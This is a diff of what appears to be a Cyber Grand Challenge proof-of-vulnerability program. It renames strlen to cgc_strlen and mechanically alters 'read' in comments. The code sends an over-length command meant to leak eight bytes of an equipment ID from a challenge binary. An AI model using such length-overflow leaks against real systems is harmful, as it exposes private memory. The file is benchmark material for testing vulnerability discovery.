@@ -137,7 +137,7 @@ void NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsig
 
 void SendCommand( const char *pszCommandData )
 {
-	size_t command_len = strlen( pszCommandData );
+	size_t command_len = cgc_strlen( pszCommandData );
 
 	SendBytes( 1, (char *)pszCommandData, command_len );
 	// transmit_all( 1, (unsigned char *)pszCommandData, command_len );
@@ -147,7 +147,7 @@ void ConsumeLines( size_t lineCount )
 {
 	char szMaxLineLen[2048];
 
-	// Limitation -- only 2048 bytes until line is read!
+	// Limitation -- only 2048 bytes until line is cgc_read!
 	for ( size_t count = 0; count < lineCount; count++ )
 		RecvUntil( 0, '\n', szMaxLineLen, 2048 );
 }
@@ -248,7 +248,7 @@ int main(void)
 	// Read enter binary message
 	read_res = delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
 
-	// Send read wheel speed command -- exceed the length and read the equipment ID -- it should leak 64-bits or 8-bytes of data
+	// Send cgc_read wheel speed command -- exceed the length and cgc_read the equipment ID -- it should leak 64-bits or 8-bytes of data
 	SendCommand( "010600010406070809\n" );
 
 	// Consume 13 lines...	
@@ -259,7 +259,7 @@ int main(void)
 
 	const char *szExpectLine = "[MESSAGE][SRC=20][DEST=0][LENGTH=13]\n";
 
-	if ( read_len != strlen(szExpectLine) )
+	if ( read_len != cgc_strlen(szExpectLine) )
 	{
 		char *szBlah = "0000";
 		SendBytes( 3, (char *)szBlah, 4 );
